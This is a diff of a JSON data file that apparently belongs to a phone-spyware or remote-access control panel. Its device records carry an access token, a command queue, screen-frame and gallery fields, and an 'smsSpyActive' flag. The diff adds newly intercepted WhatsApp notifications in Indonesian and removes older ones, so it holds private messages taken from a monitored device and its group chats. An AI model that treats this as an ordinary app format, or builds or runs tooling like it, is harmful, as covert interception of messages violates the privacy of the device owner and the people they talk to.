@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775046050541,
+    "lastSeen": 1775046053416,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15765 pesan dari 10 chat",
+        "time": "01/04 20:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046054422
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15764 pesan dari 10 chat",
+        "time": "01/04 20:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046052978
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13565 pesan): ~ Bot",
+        "content": "⏰ Waktu habis! Jawaban yang benar adalah akar tumbuhan",
+        "time": "01/04 20:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046052657
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "01/04 20:09",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045342241
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15640 pesan dari 10 chat",
-        "time": "01/04 20:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045341945
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13421 pesan): ~ r",
-        "content": ".menu",
-        "time": "01/04 20:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045341837
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13420 pesan): ~ Bot",
-        "content": "📷 𐔈⃘ ֹ ׅ 🍓 ֹ Brat Generator ֹ ׅ ୫\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Teks : jangan ganggu, lagi main epep\n╰─╼𔕬─┈───┈───┈",
-        "time": "01/04 20:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045341140
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15764 pesan dari 10 chat",
+        "time": "01/04 20:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046052816
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13565 pesan): ~ Bot",
@@ -8056,14 +8064,6 @@
         "time": "01/04 20:09",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045341907
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15639 pesan dari 10 chat",
-        "time": "01/04 20:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045341334
       }
     ],
     "galleryPhotos": [],
